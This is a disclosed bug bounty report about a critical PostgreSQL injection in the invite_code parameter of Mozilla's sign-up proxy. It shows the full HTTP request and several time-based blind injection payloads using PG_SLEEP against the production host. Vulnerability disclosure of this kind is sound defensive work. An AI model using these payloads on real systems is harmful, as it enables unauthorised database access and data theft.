# SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription

## Report Details
- **Report ID**: 2209130
- **URL**: https://hackerone.com/reports/2209130
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-10-14T12:47:48.736Z
- **Disclosed**: 2024-01-30T13:29:52.510Z

## Reporter
- **Username**: supr4s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mozilla

## Vulnerability Information
Hi everyone,

Hope you are well ! 

I wanted to play on [https://mozilla.social](https://mozilla.social), however this requires a user account and an invitation code as it's not open to the public. When entering an invitation code, the user is redirected to `prod.oidc-proxy.prod.webservices.mozgcp.net`.

{F2773206}

Playing around with what's on offer, I've noticed that the `invite_code` parameter is vulnerable to a PostgreSQL injection.

## Steps To Reproduce:

During registration, the following POST request is made : 

```
POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
Host: prod.oidc-proxy.prod.webservices.mozgcp.net
Cookie: <session_cookies>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua: "Google Chrome";v="103", "Chromium";v="103", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers

handle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on
```

Adding a single quote to the `invite_code` parameter returns a 500 error, and adding a second quote returns a 200. **Red flag**

After a few tests, here is a time-based blind payload to confirm the vulnerability : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

{F2773210}

Confirm with the response from the server - which takes 5 seconds to reply.

Now, 10 seconds : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

{F2773214}

Same here, 10 secs before getting an answer.

20 sec : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

{F2773218}

etc.

## Impact

From [OWASP](https://owasp.org/www-community/attacks/SQL_Injection) : 

> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

I'm working on a data exfiltration and will update the report as needed.

Looking forward to exchanging.

Regards,
Supr4s

## Attachments
- image.png
- image.png
- image.png
- image.png
